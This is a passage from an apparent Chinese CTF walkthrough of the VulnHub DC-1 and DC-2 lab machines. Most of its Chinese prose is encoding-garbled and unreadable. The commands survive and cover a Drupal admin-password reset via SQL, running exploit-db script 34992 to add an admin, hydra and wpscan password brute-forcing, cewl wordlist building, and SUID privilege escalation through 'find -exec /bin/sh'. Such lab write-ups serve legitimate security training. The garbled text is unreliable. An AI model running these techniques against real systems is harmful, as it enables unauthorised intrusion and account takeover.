<p>ä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°ï¼Œincludesç›®å½•ç¡®å®ä¹Ÿä¸åœ¨scriptsç›®å½•ä¸‹ï¼Œäºæ˜¯ç”¨cpæŠŠ<code>includes</code>ç›®å½•æ”¾åˆ°<code>scripts</code>ç›®å½•ä¸‹å³å¯</p>
<blockquote>
<p>è¾“å…¥<code>cp -r ../includes ./</code></p>
</blockquote>
<hr>
<p>å¾—åˆ°åŠ å¯†æ•°æ®</p>
<p><img src="/post/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p>
<p>å†æ¬¡è¿›å…¥<code>mysql</code>æ•°æ®åº“ï¼Œä¿®æ”¹ <code>admin</code>å¯†ç </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p>
<p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½ç™»å½•</p>
<blockquote>
<p>ç”¨æˆ·åï¼š<code>admin</code></p>
<p>å¯†ç ï¼š<code>123456</code></p>
</blockquote>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p>
<p>å¾—åˆ°flag3</p>
<p><img src="/post/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p>
<h3 id="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"><a href="#2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·" class="headerlink" title="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"></a>2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</h3><p>ä¼˜ç‚¹æ˜¯æ›´åŠ æ–¹ä¾¿ï¼Œå¿«æ·ï¼Œ<strong>ä½†æ˜¯è„šæœ¬ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œåªæœ‰è‡ªå·±æ˜ç™½åŸç†æ‰æ˜¯çœŸæ­£æŒæ¡</strong>ï¼Œè¿™ä¸ªçš„æœ¬è´¨ä¹Ÿæ˜¯åˆ©ç”¨<code>sql</code>æ³¨å…¥</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure>

<p>è¯¥ç½‘ç«™åœ¨kalié‡Œé¢æµè§ˆå™¨ä¹¦ç­¾è‡ªå¸¦çš„ï¼Œè¿™ä¸ªè„šæœ¬é€‚ç”¨äºdrupalï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥ç”¨å³å¯</p>
<p><img src="/post/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p>
<p>ä¸‹è½½å¥½åï¼Œè¿è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-tå°±æ˜¯ç›®æ ‡ç½‘ç«™ï¼Œ-uå°±æ˜¯æ–°å»ºçš„ç”¨æˆ·åï¼Œ-på°±æ˜¯ç”¨æˆ·åå¯†ç <br>*æ³¨æ„è¿™ä¸ªè„šæœ¬éœ€è¦ python2è¿è¡Œï¼Œpython3è¯­æ³•ä¸ç¬¦åˆ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p>
<p>ç„¶åæŒ‰ç…§è¾“å…¥çš„ï¼Œç›´æ¥ç™»å½•å°±å¯ä»¥äº†ï¼Œæˆ–è€…ç›´æ¥ç‚¹å‡»ä¸‹é¢é“¾æ¥</p>
<p><img src="/post/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p>
<p>å°±å¯ä»¥æ‹¿åˆ°<code>Flag3</code></p>
<p><img src="/post/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1ï¼‰ä¸ªäººæ–¹æ³•"><a href="#1ï¼‰ä¸ªäººæ–¹æ³•" class="headerlink" title="1ï¼‰ä¸ªäººæ–¹æ³•"></a>1ï¼‰ä¸ªäººæ–¹æ³•</h3><p>åˆ†æä¸€ä¸‹<code>flag3</code></p>
<blockquote>
<p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p>
<p>æ„æ€æ˜¯ï¼šSpecial PERMSç‰¹åˆ«çš„æƒé™ï¼ˆåº”è¯¥æ˜¯rootæƒé™ï¼‰ï¼Œpasswdåº”è¯¥æ˜¯æŸ¥çœ‹&#x2F;etc&#x2F;passwdç›®å½•ï¼ŒFINDæ„æ€åˆ©ç”¨findå‘½ä»¤ï¼Œ-execå°±æ˜¯éœ€è¦ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œ get whatâ€™s in the shadowæ„æ€æ˜¯flag4åœ¨&#x2F;etc&#x2F;shadowé‡Œ</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>etc</code>ç›®å½•</p>
<p><img src="/post/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p>
<p>å‘ç°äº†<code>passwd</code>æ–‡ä»¶</p>
<blockquote>
<p>è¾“å…¥<code>cat passwd</code></p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<p>å‘ç°æœ‰<code>flag4</code>çš„çº¿ç´¢</p>
<p><img src="/post/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p>
<p><code>flag4</code>æ˜¯åœ¨<code>/home/flag4</code>é‡Œé¢ï¼Œæˆ‘ä»¬åˆ°ç›®å½•é‡Œçœ‹çœ‹</p>
<blockquote>
<p>è¾“å…¥<code>cd /home/flag4</code></p>
</blockquote>
<p>å‘ç°æœ‰ä¸ª<code>flag4.txt</code>ï¼ŒæŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
<p>å¾—åˆ°<code>flag4</code></p>
<h3 id="2ï¼‰å®˜æ–¹æ–¹æ³•"><a href="#2ï¼‰å®˜æ–¹æ–¹æ³•" class="headerlink" title="2ï¼‰å®˜æ–¹æ–¹æ³•"></a>2ï¼‰å®˜æ–¹æ–¹æ³•</h3><p>ç”¨äº†<code>hydra</code>[ä¹å¤´è›‡]å·¥å…·ï¼Œå¯¹æˆ‘ä»¬åœ¨<code>passwd</code>é‡Œçœ‹åˆ°<code>flag4</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯<br>ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</p>
<p>ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯è‡ªå·±ä¸‹è½½çš„å¯†ç åŒ…</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°<code>flag4</code>ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>orange</code></p>
<p>ç„¶åç”¨<code>ssh</code>è¿æ¥</p>
<blockquote>
<p>è¾“å…¥<code>ssh flag4@192.168.133.136</code><br>ç„¶åyes<br>ç„¶åè¾“å…¥å¯†ç ï¼š<code>orange</code></p>
</blockquote>
<p>è¿›å…¥<code>flag4</code>ç”¨æˆ·é¡µé¢ï¼Œ</p>
<blockquote>
<p>è¾“å…¥<code>cat flag4.txt</code><br>å¾—åˆ°flag4</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><blockquote>
<p>åˆ†æä¸€ä¸‹flag5<br><code>Can you use this same method to find or access the flag in root?</code></p>
<p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p>
<p>æ„æ€æ˜¯ï¼šæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æŸ¥æ‰¾æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„æ ‡å¿—å—ï¼Ÿ</p>
<p>å¯èƒ½ä½†ä¹Ÿè®¸è¿™å¹¶ä¸å®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·ï¼Ÿ</p>
</blockquote>
<p><code>root</code>åº”è¯¥å°±æ˜¯éœ€è¦ææƒäº†</p>
<h3 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h3><p><code>linux</code>ææƒæ“ä½œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„<code>WEBéšç¬”</code>é‡Œ<code>suid</code>ææƒï¼Œä¸‹é¢åªè®°å½•æµç¨‹</p>
<blockquote>
<p>è¾“å…¥<code>find / -perm -u=s -type f 2&gt;/dev/null</code>ï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹suidæƒé™æ‰€æœ‰å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p>
</blockquote>
<p>å‘ç°<code>find</code>ç›®å½•</p>
<p><img src="/post/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
<p>äºæ˜¯å¯ä»¥åˆ©ç”¨<code>find</code>è·å–<code>root</code>æƒé™<code>shell</code></p>
<p>ä¸»è¦æ˜¯è¦è®©<code>find</code>å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ‰¾ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å³å¯</p>
<blockquote>
<p>ä»¥åœ¨æ ¹ç›®å½•ä¸ºä¾‹<br>è¾“å…¥<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p>
</blockquote>
<p>ææƒæˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
<p>æˆ‘ä»¬åœ¨<code>flag4</code>é‡ŒçŸ¥é“ï¼Œæœ€åçš„æ——å­åœ¨<code>root</code>ç›®å½•é‡Œ</p>
<blockquote>
<p>è¾“å…¥<code>cd /root;ls -a</code></p>
</blockquote>
<p>å‘ç°<code>thefinalflag.txt</code></p>
<p><img src="/post/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p>
<blockquote>
<p><code>Well done!!!!</code></p>
<p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p>
<p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>æ„æ€æ˜¯ï¼š<br>åšå¾—å¥½ï¼ï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸€ç‚¹ï¼Œå¹¶å­¦ä¹ äº†ä¸€äº›æ–°æŠ€èƒ½ã€‚</p>
<p>ä½ å¯ä»¥å‘Šè¯‰æˆ‘ä½ å¯¹è¿™æ¬¡å°æ—…è¡Œçš„çœ‹æ³•<br>é€šè¿‡Twitterè”ç³»æˆ‘-@DCAU7 </p>
</blockquote>
<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="äºŒã€DC-2-åˆçº§"><a href="#äºŒã€DC-2-åˆçº§" class="headerlink" title="äºŒã€DC-2[åˆçº§]"></a>äºŒã€DC-2[åˆçº§]</h1><p><strong>five flags</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p> å…ˆç”¨<code>nmap</code>æ‰«æä¸€äº›</p>
<blockquote>
<p>è¾“å…¥<code>nmap -p- 192.168.133.138</code></p>
</blockquote>
<p>å‘ç°å†…å®¹å¤ªå°‘äº†</p>
<p><img src="/post/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p>
<blockquote>
<p>è¾“å…¥<code>nmap -p- 192.168.133.138 -A</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>å‘ç°<code>7744</code>ç«¯å£è¿è¡Œçš„<code>ssh</code>ï¼Œ<code>22</code>ç«¯å£è¢«æ¢äº†</p>
<blockquote>
<p>Sshæ˜¯ä¸€ä¸ªå®‰å…¨çš„è¿œç¨‹ç™»å½•åè®®,å®ƒçš„ç«¯å£å·é»˜è®¤æ˜¯22ç«¯å£</p>
</blockquote>
<blockquote>
<p>SSH ä¸º Secure Shell çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚SSH æ˜¯è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚SSHæœ€åˆæ˜¯UNIXç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œåæ¥åˆè¿…é€Ÿæ‰©å±•åˆ°å…¶ä»–æ“ä½œå¹³å°ã€‚SSHåœ¨æ­£ç¡®ä½¿ç”¨æ—¶å¯å¼¥è¡¥ç½‘ç»œä¸­çš„æ¼æ´ã€‚SSHå®¢æˆ·ç«¯é€‚ç”¨äºå¤šç§å¹³å°ã€‚å‡ ä¹æ‰€æœ‰UNIXå¹³å°â€”åŒ…æ‹¬HP-UXã€Linuxã€AIXã€Solarisã€Digital UNIXã€Irixï¼Œä»¥åŠå…¶ä»–å¹³å°ï¼Œéƒ½å¯è¿è¡ŒSSHã€‚</p>
</blockquote>
<p>æˆ‘ä»¬è¯•è¯•è®¿é—®æˆ‘ä»¬çš„é¶æœº<code>ip</code>ï¼š<code>192.168.133.138</code></p>
<hr>
<p>ä½†æ˜¯è®¿é—®å¤±è´¥ã€å¦‚æœæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿½ç•¥ã€‘</p>
<p><img src="/post/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®<code>IP</code>çš„æ—¶å€™è¿›è¡Œäº†ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬åˆ°äº†<code>http://dc-2</code>ï¼Œä¸”æ— æ³•è®¿é—®</p>
<p>æˆ‘çŒœæµ‹æ˜¯<code>hosts</code>æ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼Œæ‰€ä»¥åŸŸåæ— æ³•ç™»å½•</p>
<p>éœ€è¦åœ¨<code>hosts</code>å…¶ä¸­æ·»åŠ åŸŸåï¼š<code>http://dc-2</code>å’Œå…¶ipï¼š<code>192.168.133.138</code>ï¼Œ<code>dns</code>æ‰èƒ½æ­£å¸¸è½¬æ¢</p>
<blockquote>
<p>è¾“å…¥<code>vi /etc/hosts</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p>
<p>å‘å…¶ä¸­æ·»åŠ </p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p>
<p>åˆ·æ–°æµè§ˆå™¨ï¼Œå†æ¬¡è®¿é—®<code>192.168.133.138</code>æˆ–<code>http://dc-2</code></p>
<p><img src="/post/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
<p>æˆåŠŸè¿æ¥</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>è¿›å…¥ç½‘é¡µå°±çœ‹åˆ°<code>flag</code>äº†</p>
<p><img src="/post/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
<p>ç‚¹å‡»æ‰“å¼€æŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
<blockquote>
<p><code>Flag 1:</code></p>
<p><code>Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</code></p>
<p><code>More passwords is always better, but sometimes you just canâ€™t win them all.</code></p>
<p><code>Log in as one to see the next flag.</code></p>
<p><code>If you canâ€™t find it, log in as another.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>ä½ é€šå¸¸çš„å¯†ç è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œå› æ­¤ï¼Œä¹Ÿè®¸ä½ åªéœ€è¦æˆä¸ºcewlã€‚</p>
<p>å¯†ç è¶Šå¤šè¶Šå¥½ï¼Œä½†æœ‰æ—¶ä½ æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªç™»å½•ä»¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚</p>
<p>å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä½œä¸ºå¦ä¸€ä¸ªç™»å½•</p>
<p>Â·Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚</p>
<p>é‚£æˆ‘ä»¬å°±ç”¨cewlå·¥å…·è¯•ä¸€ä¸‹<br>*ä¸ä¼šå·¥å…·ä¸€èˆ¬ç”¨-hå°±å¯ä»¥çŸ¥é“ä½¿ç”¨è¯´æ˜</p>
</blockquote>
<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>æ ¹æ®<code>flag1</code>ï¼Œæˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><blockquote>
<p>è¾“å…¥<code>cewl http://dc-2/ &gt;pass.txt</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat pass.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p>
<p><code>flag1</code>æ•´ç†ä¿¡æ¯å¥½åƒå·®ä¸å¤šäº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ©ç”¨<code>dc1</code>æåˆ°çš„<code>wappalyzer</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µçš„æ¡†æ¶ç»“æ„æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢</p>
<p><img src="/post/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
<p>å‘ç°ç½‘ç«™çš„<code>CMS</code>æ˜¯<code>WordPress</code>ï¼Œè¿˜å¯ä»¥çœ‹åˆ°å®ƒçš„ä¸»é¢˜æ˜¯<code>Twenty Seventeen</code></p>
<p>é‚£<code>wordpress</code>ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ä¾›æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Œä¸‹é¢å°±æåŠå¦ä¸€ä¸ªå·¥å…·</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><blockquote>
<p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>wpscan --url http://dc-2 -e u</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p>
<p><img src="/post/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p>
<blockquote>
<p>è¾“å…¥<code>vi un.txt</code></p>
<p>æŠŠ<code>admin</code> <code>jerry</code> <code>tom</code>å¤åˆ¶è¿›å»</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨<code>wpscan</code>è¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p>
<blockquote>
<p>è¾“å…¥<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>ç¨å¾®ç­‰ä¸€ä¼š</p>
<p><img src="/post/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p><code>admin</code>ç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p>
<p>ä½†æ˜¯<code>jerry</code>å’Œ<code>tom</code>ç”¨æˆ·çš„å¯†ç å·²ç»çŸ¥é“äº†</p>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹æ‰¾ç™»å½•çš„é¡µé¢äº†ï¼Œä¸€èˆ¬æ˜¯åå°ç½‘ç«™</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨<code>dirsearch</code>å·¥å…·è¿›è¡Œæ‰«æçœ‹çœ‹</p>
<p><img src="/post/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
<p>å‘ç°ç½‘ç«™</p>
<p><img src="/post/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
<p>ç”¨æˆ‘ä»¬ä¹‹å‰è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¯•è¯•</p>
<p>ä»¥<code>jerry</code>ä¸ºä¾‹ï¼Œå¥½åƒç”¨<code>tom</code>ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯</p>
<p>åœ¨<code>page</code>çª—å£å‘ç°<code>flag2</code></p>
<p><img src="/post/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
<p>ç‚¹å¼€æŸ¥çœ‹ï¼Œå¾—åˆ°flag2</p>
<p><img src="/post/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
<blockquote>
<p><code>Flag 2:</code></p>
<p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p>
<p><code>Hope you found another entry point.</code><br>æ„æ€æ˜¯ï¼š<br>å¦‚æœä½ ä¸èƒ½åˆ©ç”¨WordPresså¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚</p>
<p>å¸Œæœ›ä½ èƒ½æ‰¾åˆ°å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚ </p>
</blockquote>
<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>æ ¹æ®<code>flag2</code>çš„æç¤ºï¼Œå®é™…ä¸Šå°±æ˜¯è¯´ä»<code>wordpress</code>è¿™æ¡è·¯æ˜¯è¡Œä¸é€šçš„ï¼Œè¦ä»å¦å¤–çš„æ–¹å‘</p>
<p>ä½†æ˜¯å¦‚æœ<code>wordpress</code>è¡Œä¸é€šï¼Œè€Œè¿™ä¸ªç½‘ç«™å°±æ˜¯<code>wordpress</code>æ­å»ºèµ·æ¥çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™çš„å°±ä¸èƒ½ä¸‹æ‰‹</p>
<p>è™½ç„¶ç½‘ç«™çš„<code>80</code>ç«¯å£çš„<code>http</code>è¡Œä¸é€š</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨<code>nmap</code>æ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°ç«¯å£<code>7744</code>è¿è¡Œç€<code>ssh</code>ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨<code>ssh</code>ç™»å½•æˆåŠŸå‘¢</p>
<p><img src="/post/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>æˆ‘ä»¬å…ˆç”¨ä¹‹å‰ç”¨è¿‡çš„å·¥å…·<code>hydra</code>è¿›è¡Œçˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ª<code>ssh</code>çš„ç”¨æˆ·æ˜¯è°</p>
<blockquote>
<p>è¾“å…¥<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
<p>å‘ç°<code>tom</code>è´¦å·æ˜¯åœ¨è¿™é‡Œç™»å½•</p>
<p><img src="/post/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p>
<p>ç™»å½•æˆåŠŸåï¼Œ<code>ls</code>å‘ç°<code>flag3.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat flag3.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
<p>å‘ç°æ²¡æœ‰è¯¥å‘½ä»¤ï¼Œé‚£å°±å¯èƒ½æ˜¯æ²¡æœ‰æƒé™æ‰§è¡Œè¿™ä¸ªå‘½ä»¤äº†</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>çœ‹åˆ°<code>rbash</code>ï¼Œä¸è®¤è¯†ï¼ŒæŸ¥ä¸€ä¸‹</p>
<blockquote>
<p><code>rbash</code><br>å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ</p>
</blockquote>
